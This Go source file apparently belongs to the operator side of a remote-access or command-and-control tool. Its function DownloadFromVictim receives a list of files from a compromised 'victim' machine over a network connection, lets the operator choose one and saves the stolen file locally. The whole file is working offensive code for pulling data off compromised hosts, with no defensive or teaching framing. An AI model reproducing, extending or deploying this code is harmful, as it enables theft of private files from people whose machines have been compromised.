package download

import (
	"bufio"
	"encoding/gob"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
)

type FilesList struct {
	Files []string
}

type FileStruct struct {
	FileName    string
	FileSize    int
	FileContent []byte
}

func DownloadFromVictim(connection net.Conn) (err error) {

	FilesList := &FilesList{}

	dec := gob.NewDecoder(connection)
	err = dec.Decode(FilesList)
	if err != nil {
		fmt.Println("[-] Unable to decode: ", err)
	}

	for index, fileName := range FilesList.Files {
		fmt.Println("\t ", index, "\t ", fileName)
	}

	fmt.Print("[+] select file: ")
	reader := bufio.NewReader(os.Stdin)
	// 0 file.jpeg
	// 1 main.go
	userInputRaw, err := reader.ReadString('\n')
	if err != nil {
		fmt.Println(err)
	}

	file2DownloadIndex := strings.TrimSuffix(userInputRaw, "\n")

	fileIndex, err := strconv.Atoi(file2DownloadIndex)
	if err != nil {
		fmt.Println("[-] Failed to conv user input in integer: ", err)
	}

	fileName := FilesList.Files[fileIndex]
	nByte, err := connection.Write([]byte(fileName + "\n"))
	if err != nil {
		fmt.Println("[-] Failed in connection.Write: ", err)
	}

	fmt.Println("file name sent: ", nByte)

	fs := &FileStruct{}

	decoder := gob.NewDecoder(connection)
	err = decoder.Decode(fs)
	if err != nil {
		fmt.Println(err)
	}

	file, err := os.Create(fs.FileName)
	if err != nil {
		fmt.Println("[-] Failed to create file: ", err)
	}

	nBytes, err := file.Write(fs.FileContent)
	if err != nil {
		fmt.Println("failed to write in file: ", err)
	}

	fmt.Println("[+] File download successfully , ", nBytes)

	return
}
